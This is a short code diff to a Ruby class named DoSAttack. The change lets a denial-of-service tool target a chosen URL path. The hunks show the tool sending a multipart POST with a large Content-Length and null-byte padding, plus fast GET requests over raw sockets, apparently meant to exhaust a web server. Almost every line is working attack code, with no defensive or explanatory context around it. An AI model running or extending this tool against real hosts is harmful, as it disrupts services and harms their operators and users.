@@ -16,7 +16,7 @@ class DoSAttack
   PAYLOAD = "\0" * 8192
 
   def initialize host, times=50, size=1024*1024
-    @host    = host
+    @host, @path = host.split('/', 2)
     @times   = times.to_i
     @size    = size .to_i
 
@@ -28,7 +28,7 @@ class DoSAttack
 
     @length  = @payload.bytesize + @size + 7
     @header  =
-"POST / HTTP/1.1#{NEWLINE}"                                                  \
+"POST /#{@path} HTTP/1.1#{NEWLINE}"                                          \
 "Host: #{@host}#{NEWLINE}"                                                   \
 "Content-Length: #{@length}#{NEWLINE}"                                       \
 "Content-type: multipart/form-data; boundary=b#{NEWLINE}"                    \
@@ -64,7 +64,8 @@ class DoSAttack
 
   def fast_request
     request do |sock|
-      sock.write("GET / HTTP/1.1#{NEWLINE}HOST: #{@host}#{NEWLINE}#{NEWLINE}")
+      sock.write("GET /#{@path} HTTP/1.1#{NEWLINE}HOST: #{@host}" \
+                 "#{NEWLINE}#{NEWLINE}")
 
       "Fast Request: "
     end
